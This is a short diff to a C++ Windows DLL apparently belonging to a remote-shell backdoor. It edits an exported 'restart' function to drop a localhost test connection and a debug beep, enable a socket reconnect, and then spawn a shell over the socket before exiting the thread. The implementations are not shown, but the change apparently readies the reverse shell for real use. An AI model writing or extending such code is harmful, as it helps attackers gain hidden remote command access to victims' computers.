@@ -5,10 +5,7 @@
 
 extern "C" __declspec(dllexport) void restart()
 {
-    MessageBeep(MB_ICONEXCLAMATION);
-
-//    SockReconnect();
-    SockConnect("localhost", "1234");
+    SockReconnect();
     SockShell();
     ExitThread(0);
 }
